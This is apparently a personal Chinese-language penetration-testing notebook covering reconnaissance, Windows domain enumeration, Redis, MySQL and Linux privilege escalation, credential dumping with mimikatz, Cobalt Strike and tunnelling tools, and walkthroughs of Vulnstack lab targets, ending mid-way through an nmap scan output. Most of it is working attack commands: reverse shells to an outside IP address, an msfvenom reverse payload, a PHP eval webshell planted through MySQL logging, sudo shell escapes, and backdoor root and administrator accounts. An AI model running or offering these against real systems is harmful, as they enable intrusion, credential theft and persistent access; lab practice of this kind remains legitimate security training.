# 渗透

## 信息收集



### nmap

```nginx
# 【-sS】：用于探测目标主机上开放的端口
	# 使用TCP SYN扫描（也称为半开放扫描）
	# 它发送一个SYN报文段，如果接收到SYN/ACK回复，则表明该端口是开放的。

# 【-sV】：用于确定目标主机上运行的具体服务和其版本信息。
# 【-Pn】：禁用主机发现（Ping）功能。
	# 通常，在扫描之前，nmap会发送一个ICMP Echo请求或者TCP Ping来确认目标主机是否在线。
	# 但使用该选项后，nmap会跳过这个步骤，直接对目标地址进行扫描。
nmap -sS -sV -Pn 192.168.1.5
```



### WIndows信息收集

```nginx
# 查看当前用户和权限
whoami /all

# 查看网络配置信息
ifconfig /all

# 查看主机路由信息
route print

# 查看操作系统信息
systeminfo
	# 查看操作系统版本
	systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# 查看端口连接信息
netstat -ano

# 查看当前回话列表（需要管理员权限）
net session

# 查看当前网络共享信息
net share

# 查看已连接的网络共享
net use

# 查看当前进行信息(可用于杀软识别)
tasklist
tasklist /SVC

# wmic查询主机进程、进程路径、名称和id
wmic process get Name, ProcessId, ExecutablePath

  # 查询指定进程信息
  wmic process where Name="cmd.exe" get ExecutablePath

# 查看当前服务信息（显示：服务名称、路径、创建时间、运行状态）
wmic service get Caption, Name, PathName, StartName, State
	# 查询指定服务
	wmic service where Name="cmd" get Caption,PathName,State

# 查看计划任务
schtasks /query /v /fo list

# 查看自启程序信息(显示：程序名称、执行命令、程序路径、所属用户)
wmic startup get Caption, Command, Location, User

# 查看系统补丁安装信息(显示：补丁链接、名称、描述、补丁编号、安装时间)
wmic qfe get Caption, CSName, Description, HotFixID, InstalledOn

# 查看应用安装信息
wmic product get Caption, Version

# 查看本地用户组信息
net user
	# 查看指定用户信息
	net user wheat

# 查看本地管理员组
net localgroup Administrators
	# 新建用户(需要管理员权限)
	net user test test /add
	# 将新建用户添加到管理员组(需要管理员权限)
	net localgroup Administrators test /add

# 查看当前登录用户
query user
```

#### **域内基础信息收集**

```nginx
# 查看当前工作站信息(包含：计算机名、用户名、系统版本、工作站、登录的域)
net config workstation

# 查看是否存在多个域(需要高权限)
net view /domain

# 查看域内所有用户(需要域管理员权限)
net user /domain
	# 查看指定域用户信息
	net user 域用户名 /domain

# 获取所有的用户的SID、所属域、和用户描述(==需要管理员==)
wmic useraccount get Caption, Domain, Description

# 查看域用户组信息(需要域管理员权限)
net group /domain
	# 查看指定组信息(域管理员执行)
	net group "Domain Admins" /domain
	# 查看查看域控制器主机名
	net group "domain controllers" /domain
	# 查看域中的其他主机名
	net group "domain computers" /domain

# 查看域内密码策略(域管理员执行)
net accounts /domain

# 查看域控制器列表(域管理员执行)
net group "Domain Controllers" /domain

# 查看主域控制器(域管理员执行)
net time /domain

```

#### 内网资源探测

**基于ICMP（因特网控制消息协议）**

```nginx
net view                 # 查看局域网内其他主机名
net config Workstation   # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
net user                 # 查看本机用户列表
net user /domain         # 查看域用户
net localgroup administrators # 查看本地管理员组（通常会有域用户）
net view /domain         # 查看有几个域
net user 用户名 /domain   # 获取指定域用户的信息
net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
net group 组名 /domain    # 查看域中某工作组
net group "domain admins" /domain  # 查看域管理员的名字
net group "domain computers" /domain  # 查看域中的其他主机名
net group "doamin controllers" /domain  # 查看域控制器主机名（可能有多台）
```



### 收集登录信息

**Windows基础信息**

```nginx


# 查看网络连接
netstat -an

# 看登录日志
# 目的是为了寻找一下凭证如：数据库的凭证、Windows的smv凭证
# 然后根据这些凭证去寻找数据库的密码

# 查看Windows启动服务列表
net start

# 查看进程列表，可以看见运行了什么软件
tasklist

# 查看计划任务（无法加载就是权限不够）
schtasks


```

**Windows网络信息**

```nginx
# 判断存在域
ifconfig /all

net view /domain

net time /domain

netstat -ano

nslookup
```

**linux**

```nginx
# linux查看最近10次登录信息
last -n 10
# 这个登录信息上可能会有管理员的信息，要看管理员是从那台机器过来的
```



### 收集杀毒信息



### 收集密码信息

-   数据库账号密码
-   本地管理员账号密码
-   内存中的密码
    -   使用工具：mimikatz（限制Windows2008以下）
-   .ssh目录下的是否存在私钥





# 提权

## Redis提权

### .so提权

```nginx
下载地址：https://github.com/Dliv3/redis-rogue-server

# 然后上传到目标服务器

# 执行命令加载.so文件
MODULE LOAD /var/www/html/exp.so

# 任意命令执行
system.exec "ls /"

```



## Mysql提权

**主要分为：用户自定义函数提权（UDF）、（MOF）**



### Hash获取与解密

```nginx
# MySQL <= 5.6 版本
select host, user, password from mysql.user;

# MySQL >= 5.7 版本
select host,user,authentication_string from mysql.user;

# 使用网站：https://www.cmd5.com/
# 选择类型为：mysql5
```



### UDF







```nginx
# 修改数据库密码
1. 登录 mysql 终端，运行：
mysql> set password=password('new password');
mysql>flush privileges;
2. 修改 mysql user 表
mysql>use mysql;
mysql>update user set password=password('new password') where user='root';
mysql>flush privileges;
3. 使用 GRANT 语句
mysql>GRANT ALL PRIVILEGES ON *.* TO 'root'@'127.0.0.1' IDENTIFIED BY 'new password' WITH GRANT OPTION;
mysql>flush privileges;
4. mysqladmin
[root@ubuntu]# mysqladmin -u root password "new password";（注意双引号或不加）
5. 备份数据库
[root@ubuntu]# mysqldump -u root -p --databases databasesname > /tmp/db.sql
```

## Linux提权



### passwd

**普通用户可以查看：`/etc/passwd`**

**linux 的用户密码哈希存储在 `/etc/shadow` **

==查看passwd文件，如果第二列为**哈希**，则可以进行爆破，==

==如果为**X**，则哈希存储在**shadow**中==

```nginx
# 也可以进行生成密码在导入passwd中
	# 使用 Perl 编程语言中的 crypt 函数对字符串 "123456" 
	# 进行加密，使用的盐值为 "addedsalt"
perl -le 'print crypt("123456","addedsalt")'
echo "hack:adrla7IBSfTZQ:0:0:hack:/root:/bin/bash" >> passwd

# 使用 OpenSSL 库中的 passwd 工具生成一个经过加密的密码
	# 选项 -1 表示使用 MD5 算法进行加密
	# -salt hacker 指定了盐值为 "hacker"
openssl passwd -1 -salt hacker 123456
echo "hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:hacker:/root:/bin/bash" >> /etc/passwd
```



### sudo提权

```nginx
# awk提权，通过使用awk命令的system函数调用/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'

# bash 提权（Linux 的默认 shell）
sudo bash

# curl 提权读文件
# /etc/shadow是Linux存储用户账户密码哈希值的文件
sduo curl file:///etc/shadow

# dash 提权
sudo dash

# ed 提权
# ed是Linux中功能最简单的文本编辑程序
sudo ed
!/bin/sh

# 查询环境变量
sudo env /bin/sh
id

# ftp 提权
sudo ftp
!/bin/sh

# less 提权（可以随意浏览文件）
sudo less /etc/passwd
!/bin/sh

# man（帮助手册命令）
sudo man man
!/bin/sh

# more 提权
# 类似cat，不过以一页一页的形式展示，按空格下一页，按b回退
sudo more /etc/passwd
!/bin/sh

# scp 提权
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF 112.124.52.200:20000 y:

# SSH
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' 反弹ip

# vi 提权
sudo vi -c ':!/bin/sh' /dev/null


# socat 提权(需要安装)
sudo socat stdin exec:/bin/sh

# zsh 提权（需要安装）
sudo zsh

# pico 提权
sudo pico
# Ctrl+R Ctrl+X
^R^X
reset; sh 1>&0 2>&0


# scp 提权
# 使用mktemp命令生成临时文件，将其路径保存在TF变量中
TF=$(mktemp)
# 向该临时文件中写入一行bash脚本代码
echo 'sh 0<&2 1>&2' > $TF
# 用chmod命令为临时文件设置可执行权限
chmod +x "$TF"
# 将该临时文件上传到远程主机x中
sudo scp -S $TF x y:


# perl 提权
sudo perl -e 'exec "/bin/sh";'

# git 提权
sudo git -p help config
!/bin/sh

# scrip 提权
sudo script -q /dev/null

###########################################################

# tclsh 提权（Ubuntu18 不安装）
sudo tclsh
exec /bin/sh <@stdin >@stdout 2>@stderr

# ash提权（Ubuntu18默认不安装）
sudo ash

# csh 提权（Ubuntu18默认不安装）
sudo csh

# expect 提权（Ubuntu18默认不安装）
# expect是一个自动化交互套件，主要应用于执行命令和程序时，
# 系统以交互形式要求输入指定字符串，实现交互通信
sudo expect -c 'spawn /bin/sh;interact'
```

### SID提权

```nginx
# 查找具体sid权限的文件
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

# taskset命令用于设置进程（或 线程）的处理器亲和性
# 可以将进程（或 线程）绑定到特定的一个
# 多个CPU上去执行，而不允许将进程（或 线程）调度到其他的CPU上。
taskset 1 /bin/sh -p
```



### SUID提权（靶场）

> **SUID这个是uid +s的组合，s指的是特殊权限**

> 一般情况下，用户的权限是3位，比如0755这样的，特殊权限默认没有配置，
>
> 但是如果超级管理员希望用户在执行一些特殊权限文件时，拥有root的权限，就会配置特殊权限

> 比如说passwd这个命令，这个命令会修改/etc/shadow文件，而/etc/shadow只有root才能修改，本来passwd这个命令应该也只能root才能执行的。但是系统为了让普通用户能够修改自己的密码，对passwd这个命令赋予了特殊权限并添加了只能修改自己密码的限制

```nginx
# find命令查找所有suid文件
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;

# 敏感文件
-rw-r--r-- 1 susan susan 20 Jul  9  2018 /home/susan/.secret

# 根据运行的结果进行利用
bob@linsecurity:~$ cat /home/susan/.secret 
MySuperS3cretValue!

# 登录到susan账户
su susan
MySuperS3cretValue!

# 如果存在xxd：以十六进制形式显示文件
-rwsr-x--- 1 root itservices 18552 Apr 10  2018 /usr/bin/xxd

# 它所在的itservices组具有执行权限，提权命令
xxd "/etc/shadow" |xxd -r
```



## 隐藏文件利用

```nginx
# 搜索home目录下的隐藏文件
find / -name ".*" -type f -path "/home/*" -exec ls -al {} \; 2>/dev/null
```



## NFS提权

```nginx
# nmap检测开放服务
nmap -sS -Pn -p- -A IP

# 目标地址运行命令验证是否挂载了NFS
rpcinfo -p 本机IP
```



# 渗透工具

## ngrok内网穿透

https://dashboard.ngrok.com/get-started/your-authtoken

- 进入ngrok官网`ngrok.com`下载ngrok.exe

- 注册一个账号，登陆账号进入管理后台，获取Token，即左侧的Your Authtoken

- 打开你的windows cmd命令行工具

- 双击ngrok.exe，然后执行以下命令

  - ```nginx
    # Authtoken 保存在默认配置文件中。
    ngrok config add-authtoken 你的Token
    ```

- 然后就可以开启内网穿透服务了，输入以下命令

  - ```nginx
    ngrok http 80
    ```






## sunny-ngrok内网穿透

> **需要实名认证，然后可以开通一个免费隧道**

> **远程端口为服务器中的端口，本地端口为目标机的ip和端口**

> **然后将sunny.exe文件上传至目标机**
>
> ```nginx
> # 输入命令
> sunny.exe --clientid=你的id
> ```



## mimikatz获取账号密码



```nginx
# 抓取密码并输出到文件中
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit >> tes.txt
```



## cobalt strike 

### 4.8

```nginx
# 下载放在linux中
# 解压
mkdir cs4.8
unrar x CobaltStrike4_8_lusuo.rar ./cs4.8
cd Server
# 赋予执行权限
chmod +x teamserver
chmod +x TeamServerImage 

# 开启服务端
sudo ./teamserver 192.168.64.131 123456

# 开启客户端
cd ..
cd Client
# 赋予执行权限
chmod +x cobaltstrike-client.cmd

# 启动客户端
./cobaltstrike-client.cmd 
```

### 联动msfconsole

```nginx
# 首先在msf建立监听
use exploit/multi/handler 
```



### 安装插件

```nginx
# 梼杌
https://github.com/pandasec888/taowu-cobalt-strike

# 黑魔鬼
https://github.com/SeaOf0/CSplugins
```



## neoreg

官网地址：https://github.com/L-codes/Neo-reGeorg

> **他是一个socket代理工具，支持内网代理**

```nginx
# 这条命令生成各种后缀的代理文件，password为任意
python neoreg.py generate -k password

# 本地开启代理，并输入代理目标地址
python3 neoreg.py -k password -u http://xx/tunnel.php
```



## nmap

官网地址：https://nmap.org/download.html

npcat无法使用重新安装：https://npcap.com/#download

> **常用扫描**
>
> ```nginx
> nmap -sS -sV -Pn -T4 -A 192.168.47.129
> 
> # 【-sS】代表使用半开式SYN扫描，这种扫描方式很少在目标主机上留下扫描日志
> # 【-sV】代表版本探测，探测服务的版本
> # 【-Pn】代表穿过防火墙扫描 （开了防火墙尽量用这个）
> # 【-T4】代表扫描时间间隔，设置速度等级，0-5级，数字越大，
> 	# 扫描时间间隔越小，速度就越快。 （T0-T2串行扫描，T3-T5并行扫描）
> ```
>
> 

> **网络扫描和端口扫描工具**

```nginx
# 只执行主机存活性检测，而不进行端口扫描，并禁用 ARP ping 扫描
# 也就是ping扫描
sudo nmap -sn 192.168.43.95 -disable-arp-ping

# 如果确定目标主机实际上是在线的，但它屏蔽了 ping 探测包
# -Pn：绕过 ping 检测
sudo nmap -sn 192.168.43.95 -Pn -disable-arp-ping
```

> **使用防火墙设置防ping**
>
> ```nginx
> sudo iptables -I INPUT -p ICMP -j DROP
> sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK --dport 80 -j DROP
> sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN --dport 443 -j DROP
> ```

> **使用TCP SYN Ping绕过防火墙**
>
> ```nginx
> sudo nmap -sP -PS 192.168.43.132 -disable-arp-ping
> # -PS：默认在80端口发送TCP SYN数据包，也可以指定端口-PS443
> ```
> > **设置过滤TCP SYN Ping扫描**
>
> ```nginx
> sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN -j DROP
> ```



> **使用TCP ACK Ping绕过TCP SYN Ping**
>
> ```nginx
> sudo nmap -sP -PA 192.168.43.132 -disable-arp-ping
> # 为了绕过它，我们使用TCP ACK数据包的Ping扫描，
> # 所有要使用-PA参数来在80端口发送TCP ACK数据包，和上面一样也可以指定端口。
> # ACK数据包发送到80端口。目标以RST数据包回复。
> ```
> > **再拦截上面的TCP ACK Ping扫描**
>
> ```nginx
> # 把防火墙设置成TCP连接中的ACK数据包都拦截掉
> sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK -j DROP
> ```



> **使用ICMP回环绕过TCP ACK Ping**
>
> ```nginx
> sudo nmap -sP -PE 192.168.43.132 -disable-arp-ping
> # 使用-PE参数发送ICMP回环数据包
> ```
>
> > **再拦截上面的ICMP回环**
>
> ```nginx
> sudo iptables -A INPUT -p icmp -m icmp --icmp-type echo-request -j DROP
> ```

> **使用ICMP时间戳Ping绕过ICMP回环**
>
> ```nginx
> sudo nmap -sP -PP 192.168.43.132 -disable-arp-ping
> # 使用-PP参数来发送ICMP时间戳数据包
> ```
>
> > **再拦截所有ICMP扫描**
> >
> > ```nginx
> > sudo iptables -I INPUT -p ICMP -j DROP
> > # 这条过滤规则会使ssh链接断开
> > ```
> >
> > ```nginx
> > # 清空防火墙规则
> > sudo iptables -F
> > ```

> **使用UDP绕ICMP扫描**
>
> ```nginx
> # -PU：使用udp进行扫描
> sudo nmap -sP -PU 192.168.43.132 -disable-arp-ping
> 
> # 看到目标回复Destination unreachable (Port unreachable)，这就表示主机还活着。
> ```
>
> > **再把UDP拦截了**
> >
> > ```nginx
> > sudo iptables -I INPUT -p ICMP -j DROP
> > sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK --dport 80 -j DROP
> > sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN --dport 443 -j DROP
> > sudo iptables -I INPUT -p udp -j DROP
> > ```

> **利用协议绕过UDP和Ping**
>
> ```nginx
> # 在ICMP TCP和UDP都被拦截时，我们可以用-PO参数发送有IP头中特定协议号的IP数据包，
> # 如果没有指定协议，则发送多个用于ICMP，IGMP和IP-in-IP协议
> sudo nmap -sP -PO 192.168.43.132 -disable-arp-ping
> 
> ```
>
> > **禁止IP协议扫描**
> >
> > ```nginx
> > sudo iptables -I INPUT -p ICMP -j DROP
> > sudo iptables -I INPUT -p tcp --tcp-flags ALL ACK --dport 80 -j DROP
> > sudo iptables -I INPUT -p tcp --tcp-flags ALL SYN --dport 443 -j DROP
> > sudo iptables -I INPUT -p udp -j DROP
> > sudo iptables -I INPUT -p IP -j DROP
> > ```

> **使用NO Ping绕过IP协议**
>
> ```nginx
> # 当Ping扫描被拦截就用-PN参数，不用Ping扫描，
> # 这种方法可以判断主机的状态时up还是down。
> sudo nmap -sP -PN 192.168.43.132 -disable-arp-ping
> ```
>
> https://www.secpulse.com/archives/69585.html

```nginx
# 综合扫描选项，包含操作系统识别、端口扫描和脚本扫描
nmap -A ip

# 探测主机是否在线
nmap -sS ip

# 忽略主机的存活检测，直接进行端口扫描
	# 因为nmap会先对主机进行ping测试或者其他存活，
	# 如果判断主机连接不了或者被过滤了请求就不会进行端口扫描
nmap -Pn ip

# 探测主机端口状态
nmap -sT ip

# 探测主机开放的UDP端口
nmap -sU ip

# 识别目标主机操作系统类型和版本
nmap -O ip

# 指定端口扫描范围
nmap -p 80-100 ip
nmap -p 80,443,8080 ip

# 显示详细信息，包括扫描过程中的进度、扫描结果和统计信息
nmap -v ip
```



## fscan

**下载地址**：https://github.com/shadow1ng/fscan/releases/download/1.8.2/fscan_386

> 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描
>
> - 支持主机**存活探测**、**端口扫描**、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。

- 信息收集

  - **存活探测(icmp)**
  - **端口扫描**

- 爆破功能:

  - 各类服务爆破(ssh、smb、rdp等)
  - 数据库密码爆破(mysql、mssql、redis、psql、oracle等)
- 系统信息、漏洞扫描:

  - netbios探测、域控识别
  - 获取目标网卡信息
  - 高危漏洞扫描(ms17010等)

- Web探测功能:

  - webtitle探测
  - web指纹识别(常见cms、oa框架等)
  - web漏洞扫描(weblogic、st2等,支持xray的poc)

- 漏洞利用:

  - redis写公钥或写计划任务
  - ssh命令执行
  - ms17017利用(植入shellcode),如添加用户等

- 其他功能:

  - 文件保存

### 使用

```nginx
# 首先需要知道本机ip
ifconfig

# 然后将下载文件上传到服务器
# 赋予：读写执行权限
chmod 777 fscan_386

fscan_386 -h 192.168.1.1/24  (默认使用全部模块)
fscan_386 -h 192.168.1.1/16  (B段扫描)

# 扫描并将扫描结果写入文件
fscan_386 -h 192.168.0.2/24 -o 0vers1eep.txt 
```







# 红日安全

## 红队实战(—)

靶场下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/

靶机通用密码： hongrisec@2019

登录修改密码：hongrisec@2023

### 网络配置

**WIndows 10：虚拟机宿主机**

**kali：NAT模式**，模拟外网攻击机

**win7：NAT模式、一个VMnet1网卡**，模拟web服务器

**Server 2003：VMnet1网卡**，模拟内网域成员主机

**Server 2008：Vmnet1网卡**，模拟内网域控主机

![靶场一拓扑图 (1)](./assets/靶场一拓扑图 (1).png)

**WIndows 7 打开小皮面板运行网站**

**外网主机如不能直接访问到win7 网站，防火墙开放80端口**

### 外网渗透

> **使用御剑扫描一下web目录**

![image-20230813195741534](./assets/image-20230813195741534.png)

> 发现数据库后台登录地址，访问后台登录地址，
>
> **使用phpMyadmin登录弱口令爆破工具可以爆破用户名密码**
>
> **弱口令账号密码为：root/root**

#### 拿shell

**利用`general_log`和`general_log_file`上传shell**

- `general_log`：是布尔参数，用于控制是否启用通用查询日志记录。
  - 当将其设置为 `ON` 时，MySQL将开始记录所有的查询日志。当设置为 `OFF` 时，日志记录将停止。
- `general_log_file`：**用于指定通用查询日志文件的路径和名称**。
  - 该文件用于**存储记录的查询日志**。

> 通过查看变量信息可以发现上面两个参数的值

![image-20230813200607731](./assets/image-20230813200607731.png)

```nginx
# 执行sql语句修改这两个变量的值
set global general_log = "on"
# 设置日志存储路径
set global general_log_file = "C:/phpStudy/WWW/sh.php"
```

![image-20230813200913664](./assets/image-20230813200913664.png)

```nginx
# 写入shell
select "<?php eval($_POST['cmd']);?>";
```

> **然后访问成功连接上后门**

![image-20230813201702931](./assets/image-20230813201702931.png)

> 其中还有一个备份文件，可以下载打开看看，**可以发现服务器中还运行一个yxcms**

![image-20230813201938131](./assets/image-20230813201938131.png)

> 识别出cms的指纹为yxcms就可以去网上搜索一下这个cms是否存在相关的漏洞利用
>
> **然后在这个网页公告栏可以看到这个网站后台的默认密码**

![image-20230813202139181](./assets/image-20230813202139181.png)

> 然后通过公告栏上账号密码成功登录进来

![image-20230813202232362](./assets/image-20230813202232362.png)

> 然后通过前台模板编辑可以编辑主页，然后插入任意代码getshell

![image-20230813202711635](./assets/image-20230813202711635.png)

![image-20230813202753386](./assets/image-20230813202753386.png)



### 内网渗透

#### **远程登录**

> 查看当前用户的权限，还有3389端口开放情况，

```nginx
whoami
netstat -an | find "3389"
或
netstat -an | findstr "3389"
```

![image-20230813203657385](./assets/image-20230813203657385.png)

> **当前的用户为：administrator，可以发现并没有3389端口**
>
> ```nginx
> # 通过以下命令手动开启3389端口
> 
> # 执行此命令后，将会修改注册表中的 fDenyTSConnections 键值，将其设置为 0，表示允许远程桌面连接。
> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
> ```

![image-20230813205142899](./assets/image-20230813205142899.png)

> **成功开启3389端口，但是目前只知道账号，不知道密码，无法直接远程登录到服务器**
>
> **那么可以添加用户，因为当前用户的权限很高**
>
> ```nginx
> # 添加用户
> net user chat P@ssw0rd123 /add
> 
> # 添加管理源权限
> net localgroup administrators chat /add
> 
> # 测试用户是否添加成功
> net user chat
> ```

![image-20230813205756967](./assets/image-20230813205756967.png)

> **然后登录远程桌面，但是登录失败，服务器设置了3389端口只能本地链接**
>
> 此时思路一般如下：
>
> 1. **反弹一个msf的shell回来，尝试关闭防火墙**
> 2. **使用cs生成木马然后进行远程登录**
> 3. **尝试使用隧道连接3389**

##### 第一种：msf反弹shell

```nginx
# 使用msfvenom生成payload文件，使用蚁剑上传到win7
# 命令格式：msfvenom -p windows/<payload类型> LHOST=<攻击者IP> LPORT=<监听端口> -f <输出格式> > <保存路径\文件名>

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.64.131 LHOST=8888 -f exe > shell.exe

# 然后将生产的.exe文件使用蚁剑上传到服务器中

# 使用kali开启监听端口
msfconsole
use exploit/multi/handler 
set payload/windows/x64/meterpreter/reverse_tcp
options
set LHOST 192.168.64.131
set LPORT 8888
exploit

# 然后将生成的shell.exe文件通过蚁剑上传到服务器中，并执行
shell.exe

```

```nginx
nc -lvnp 20000
bash -i >& /dev/tcp/112.124.52.200/20000 0>&1
zsh -c 'zmodload zsh/net/tcp && ztcp 192.168.64.131 4444 && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'

```

**基础提权**

```nginx
meterpreter > getuid
Server username: GOD\Administrator

meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

# 成功提权至最高权限
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter >
```

**抓取明文密码**

```nginx
# 首先查看系统信息
# 但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，
# 直接默认加载该模块会导致很多功能无法使用。
# 所以如果目标系统是64位的，则必须先查看系统进程列表，
# 然后将meterpreter进程迁移到一个64位程序的进程中，
# 才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制
meterpreter > sysinfo
```

![image-20230814203500176](./assets/image-20230814203500176.png)

> **然后通过ps命令找到lsass.exe命令**

![image-20230814203556239](./assets/image-20230814203556239.png)

```nginx
# 输入命令进行迁移
meterpreter > migrate 500
[*] Migrating from 332 to 500...
[*] Migration completed successfully.

# 加载模块
meterpreter > load mimikatz
# 抓取明文密码
meterpreter >	mimikatz_command -f sekurlsa::searchPasswords

```





**开启远程端口**

```nginx
# 使用以下命令
meterpreter > run post/windows/manage/enable_rdp

[*] Enabling Remote Desktop
[*]     RDP is already enabled
[*] Setting Terminal Services service startup mode
[*]     The Terminal Services service is not set to auto, changing it to auto ...
[*]     Opening port in local firewall if necessary
[*] For cleanup execute Meterpreter resource file: /home/kali/.msf4/loot/20230814142959_default_192.168.64.130_host.windows.cle_953520.txt

# 其中：/home/kali/.msf4/loot/20230814142959_default_192.168.64.130_host.windows.cle_953520.txt
# 这个文件用来关闭远程连接
run multi_console_command -r 文件地址
```

**成功远程连接到系统**

![image-20230814143337709](./assets/image-20230814143337709.png)

##### 第二种隧道连接3389

> 也就是使用内网穿透

##### 第三种：mimikatz

> **使用mimikatz直接抓取明文密码**

```nginx
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" exit >> tes.txt
```

> **然后将输出结果的tes.txt文件下载，里面有明文密码**

##### 

#### 域内信息收集

```nginx
# 执行
ipconfig /all
```

![image-20230814204726793](./assets/image-20230814204726793.png)

> ```nginx
> # 查询域列表
> net view /domain
> 
> # 查询同域机器
> net view
> 
> # 判断主域
> net time /domain
> 
> ```
>
> ![image-20230814220054777](./assets/image-20230814220054777.png)
>
> **查询当前计算机名、计算机全名、用户名、工作站、软件版本、工作站域、工作站域 DNS 名称、登录域**
>
> ```nginx
>  net config Workstation
> ```
>
> ![image-20230814220411827](./assets/image-20230814220411827.png)
>
> **当前域中的计算机列表**
>
> ```nginx
> net user /domain
> ```
>
> 

> **上线cs，获取域内机器ip地址**
>
> ```nginx
> net view
> ```
>
> ![image-20230815090536635](./assets/image-20230815090536635.png)

#### 上线cs获取信息

**上传cs的payload，然后双击上传的主机**

```nginx
# 设置快速回显
sleep 0

# 查看当前用户
shell whoami

# 查看系统信息
shell systeminfo

# 提权
ms14_058
```

![image-20230815123301653](./assets/image-20230815123301653.png)



#### 整理结论

```nginx
# 存在域
god.org
# 域内账号三个
Administrator、ligang、liukaifeng01
# 域内三台主机：
ROOT-TVI862UBEH(192.168.52.141)、STU1(win7)、OWA
# 域控：
OWA：192.168.52.138
# win7内网ip：
192.168.52.143
```



### 横向移动

#### 添加路由、挂socks4a代理

> **添加路由的目的是为了让MSF其他模块能访问内网的其他主机**，
>
> **也就是52网段的攻击流量都通过已渗透的这台目标主机的meterpreter会话来传递**

> **添加socks4a代理的目的是为了让其他软件更方便的访问到内网的其他主机的服务**
>
> **（添加路由一定要在挂代理之前，因为代理需要用到路由功能）**

```nginx
# 获取本地子网信息，描主机系统的网络配置，并确定有效的本地子网范围
run get_local_subnets

# 添加内网路由 
run autoroute -s 192.168.52.0/24

# 新建路由
run post/multi/manage/autoroute

# 查看路由
run autoroute -p

# ARP 缓存表
[08/15 12:57:27] beacon> arp -a
[08/15 12:57:27] [-] Unknown command: arp -a
[08/15 12:57:32] beacon> shell arp -a
[08/15 12:57:32] [*] Tasked beacon to run: arp -a
[08/15 12:57:32] [+] host called home, sent: 37 bytes
[08/15 12:57:32] [+] received output:


接口: 192.168.52.143 --- 0xb

  Internet 地址         物理地址              类型

  192.168.52.138        00-0c-29-3f-5d-a9     动态        

  192.168.52.141        00-0c-29-6d-39-34     动态        

  192.168.52.255        ff-ff-ff-ff-ff-ff     静态        

  224.0.0.22            01-00-5e-00-00-16     静态        

  224.0.0.252           01-00-5e-00-00-fc     静态        

  239.255.255.250       01-00-5e-7f-ff-fa     静态        



接口: 169.254.129.186 --- 0x17

  Internet 地址         物理地址              类型

  169.254.255.255       ff-ff-ff-ff-ff-ff     静态        

  224.0.0.22            01-00-5e-00-00-16     静态        

  224.0.0.252           01-00-5e-00-00-fc     静态        

  239.255.255.250       01-00-5e-7f-ff-fa     静态        

  255.255.255.255       ff-ff-ff-ff-ff-ff     静态        



接口: 192.168.64.130 --- 0x19

  Internet 地址         物理地址              类型

  192.168.64.2          00-50-56-f3-1c-8b     动态        

  192.168.64.131        00-0c-29-10-be-10     动态        

  192.168.64.254        00-50-56-e9-64-99     动态        

  192.168.64.255        ff-ff-ff-ff-ff-ff     静态        

  224.0.0.22            01-00-5e-00-00-16     静态        

  224.0.0.252           01-00-5e-00-00-fc     静态        

  239.255.255.250       01-00-5e-7f-ff-fa     静态        

  255.255.255.255       ff-ff-ff-ff-ff-ff     静态        


```





## 红日靶场(二)



### 网络配置

> **vm打开机子首先不开机，先返回快照三，然后再设置网卡**
>
> ![image-20230819085349313](./assets/image-20230819085349313.png)

web：外网nat + 内网 v1

pc：外网nat + 内网 v1

dc：内网 v1

![image-20230819085651352](./assets/image-20230819085651352.png)

> **开机之后，360弹框统一账号密码为：administrator 、1qaz@WSX**
>
> **拥有外网网卡的主机配置外网网卡，如果无法直接上网，直接诊断并修复就好**



### 信息收集

> **arp-scan收集**
>
> ```nginx
> >>> arp-scan -l                                    
> Interface: eth0, type: EN10MB, MAC: 00:0c:29:10:be:10, IPv4: 192.168.199.129
> Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
> 192.168.199.1   00:50:56:c0:00:08       VMware, Inc.
> 192.168.199.2   00:50:56:e1:2f:64       VMware, Inc.
> 192.168.199.131 00:0c:29:ed:b0:16       VMware, Inc.
> 192.168.199.132 00:0c:29:35:df:e1       VMware, Inc.
> 192.168.199.254 00:50:56:f1:6b:60       VMware, Inc.
> 
> 7 packets received by filter, 0 packets dropped by kernel
> Ending arp-scan 1.10.0: 256 hosts scanned in 1.992 seconds (128.51 hosts/sec). 5 responded
> 
> ```
>
> **nmap收集**
>
> - -sS：syn半开扫描，避免留下扫描日志
> - -sV：版本探测
> - -Pn：过防火墙
> - -T4：扫描速度，可设置（1~5）
> - -A：
>
> ```nginx
> >>> nmap -sS -sV -Pn -T4 -A 192.168.199.131                 ✔ │ root@kali  09:09:10 
> Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-19 09:09 CST
> Nmap scan report for 192.168.199.131 (192.168.199.131)
> Host is up (0.00086s latency).
> Not shown: 989 filtered tcp ports (no-response)
> PORT      STATE SERVICE        VERSION
> 80/tcp    open  http           Microsoft IIS httpd 7.5
> |_http-server-header: Microsoft-IIS/7.5
> |_http-title: Site doesn't have a title.
> | http-methods: 
> |_  Potentially risky methods: TRACE
> 135/tcp   open  msrpc          Microsoft Windows RPC
